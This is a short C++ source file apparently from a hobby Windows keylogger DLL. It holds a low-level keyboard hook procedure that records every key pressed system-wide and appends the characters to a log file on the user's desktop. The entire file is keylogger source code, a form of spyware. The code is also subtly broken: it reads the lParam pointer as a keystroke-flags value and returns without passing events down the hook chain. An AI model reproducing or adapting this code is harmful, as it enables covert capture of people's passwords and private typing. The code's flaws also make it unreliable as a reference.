#pragma once
#include "KeyLoggerDLL.h"
#include "KeyLoggerGlobals.h"
#include <iostream>
#include <fstream>
#include <cstdlib>

LRESULT CALLBACK KeyboardHookProc(
	int nCode,
	WPARAM wParam,
	LPARAM lParam
	)
{
	if (nCode < 0)
	{
		return CallNextHookEx(NULL, nCode, wParam, lParam);
	}

	KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
	std::ofstream myfile;
	myfile.open("C:\\Users\\paul\\Desktop\\TEST.log", std::ios_base::app);
	
	if (!myfile.is_open())
	{
		MessageBeep(0);
		MessageBox(NULL, L"Failed to find log file.", L"Key Logger", MB_ICONERROR);
		std::exit(EXIT_FAILURE);
	}

	if (wParam == WM_KEYDOWN)
	{
		if ((nCode == HC_ACTION) && ((DWORD)lParam & 0x80000000) == 0)
		{
			char keyPressed = (char)MapVirtualKey(kbdStruct->vkCode, _In_ MAPVK_VK_TO_CHAR);
			if (!keyPressed)
			{
				myfile << "Key conversion failed!" << std::endl;
			}
			myfile << keyPressed;
		}
	}

	myfile.close();
	return 0;
}